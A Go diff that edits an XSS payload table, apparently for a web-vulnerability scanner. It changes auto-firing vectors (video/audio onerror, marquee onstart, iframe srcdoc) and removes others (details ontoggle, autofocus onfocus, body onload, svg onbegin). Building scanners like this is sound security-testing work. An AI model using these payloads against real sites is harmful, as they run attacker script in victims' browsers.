@@ -42,13 +42,10 @@ type LibraryVector struct {
 	Why string
 }
 
-// Library is the cheat-sheet family table. Add entries here, not to the planner.
+// Library is the cheat-sheet family table. Add entries here, not to the planner,
+// and only for families the canonical set (candidate.go) does NOT already carry:
+// a duplicate would spend a request on a shape the planner already sent.
 var Library = []LibraryVector{
-	{
-		ID: "details_ontoggle", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
-		Build: func(m string) string { return fmt.Sprintf(`<details open ontoggle=%s>`, m) },
-		Why:   "details fires ontoggle while parsing when the open attribute is present",
-	},
 	{
 		ID: "video_source_onerror", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
 		Build: func(m string) string { return fmt.Sprintf(`<video><source onerror=%s>`, m) },
@@ -57,42 +54,17 @@ var Library = []LibraryVector{
 	{
 		ID: "audio_onerror", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
 		Build: func(m string) string { return fmt.Sprintf(`<audio src=x onerror=%s>`, m) },
-		Why:   "a media element with an unreachable source fires onerror",
+		Why:   "a media element with an unreachable source fires onerror while loading",
 	},
 	{
 		ID: "marquee_onstart", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
 		Build: func(m string) string { return fmt.Sprintf(`<marquee onstart=%s>`, m) },
-		Why:   "marquee fires onstart while parsing",
-	},
-	{
-		ID: "input_autofocus_onfocus", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
-		Build: func(m string) string { return fmt.Sprintf(`<input autofocus onfocus=%s>`, m) },
-		Why:   "autofocus moves focus during load, firing onfocus without a click",
-	},
-	{
-		ID: "select_autofocus_onfocus", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
-		Build: func(m string) string { return fmt.Sprintf(`<select autofocus onfocus=%s>`, m) },
-		Why:   "the same autofocus mechanism on a select element",
-	},
-	{
-		ID: "textarea_autofocus_onfocus", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
-		Build: func(m string) string { return fmt.Sprintf(`<textarea autofocus onfocus=%s>`, m) },
-		Why:   "the same autofocus mechanism on a textarea element",
-	},
-	{
-		ID: "body_onload", Contexts: []Context{CtxHTMLText, CtxHTMLAttrName, CtxHTMLTagName}, Trigger: TriggerLoad, Needs: "t>=",
-		Build: func(m string) string { return fmt.Sprintf(`<body onload=%s>`, m) },
-		Why:   "a new body element carries onload and fires it on load",
+		Why:   "marquee fires onstart while parsing, before any interaction",
 	},
 	{
 		ID: "iframe_srcdoc", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=\"",
-		Build: func(m string) string { return fmt.Sprintf(`<iframe srcdoc="<svg onload=%s>"></iframe>`, m) },
+		Build: func(m string) string { return fmt.Sprintf(`<iframe srcdoc="<audio src=x onerror=%s>"></iframe>`, m) },
 		Why:   "srcdoc is parsed as its own document, so the inner handler runs on load",
-	},
-	{
-		ID: "svg_animate_begin", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "t>=",
-		Build: func(m string) string { return fmt.Sprintf(`<svg><animate onbegin=%s attributeName=x dur=1s>`, m) },
-		Why:   "SMIL begin fires on the animation start, with no user interaction",
 	},
 	{
 		ID: "form_action_jsurl", Contexts: []Context{CtxHTMLText}, Trigger: TriggerInteraction, Needs: "t>=\"",
